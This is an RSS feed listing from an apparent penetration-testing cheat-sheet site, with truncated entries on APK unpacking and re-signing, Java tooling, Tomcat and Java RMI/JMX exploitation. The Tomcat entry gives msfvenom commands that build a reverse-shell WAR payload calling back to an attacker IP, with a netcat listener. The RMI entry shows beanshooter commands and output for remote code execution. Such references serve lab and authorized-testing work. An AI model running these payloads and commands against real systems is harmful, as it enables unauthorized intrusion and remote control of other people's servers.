channel.title: Java on TLDRBins
channel.description: Recent content in Java on TLDRBins

item.title: Android
item.description: Unpack .apk File # Get .smali files java -jar apktool_2.9.3.jar d <FILE> # Get .java files jadx <FILE> Ref: apktool Ref: jadx Re-pack .apk File 1. Initial Pack java -jar apktool_2.9.3.jar b --use-aapt2 <APP> -o <APP>_repacked.apk 2. Zip Align zipalign 3. Sign the Apk keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias apksigner sign --ks my-release-key.jks --ks-pass pass:'<PASSWORD>' --out <APP>_final.apk <APP>_repacked.apk Dynamic Debugging 1. Set up +--------------------------------------------------------------------+ | 1.

item.title: Apache Tomcat
item.description: Config Location /usr/share/tomcat9/etc/tomcat-users.xml /etc/tomcat9/tomcat-users.xml RCE (Authenicated) 1. Create a WAR File msfvenom -p java/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war -o revshell.war $ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.31 LPORT=1337 -f war -o revshell.war Payload size: 13029 bytes Final size of war file: 13029 bytes Saved as: revshell.war 2. Start a Listener rlwrap nc -lvnp <LOCAL_PORT> $ rlwrap nc -lvnp 1337 listening on [any] 1337 .. 3a. Manager GUI 3b. Manager Script +--------------------------------------------+ | Exploit | +--------------------------------------------+ | 1.

item.title: Java
item.description: Decompile JAR jd-gui Ref: Download jd-gui Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ .

item.title: Java Environment
item.description: Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac

item.title: Java RMI
item.description: RMI (Remote Method Invocation) rmg Enum java -jar rmg.jar enum <TARGET> <PORT> Ref: remote-method-guesser JMX (Java Management Extensions) beanshooter Enum java -jar beanshooter.jar enum <TARGET> <PORT> RCE # 1. Upload payload java -jar beanshooter.jar standard <TARGET> <PORT> tonka $ java -jar beanshooter.jar standard 10.10.69.227 2222 tonka [+] Creating a TemplateImpl payload object to abuse StandardMBean [+] [+] Deplyoing MBean: StandardMBean [+] MBean with object name de.qtc.beanshooter:standard=5515770682654 was successfully deployed. [+] [+] Caught NullPointerException while invoking the newTransformer action.
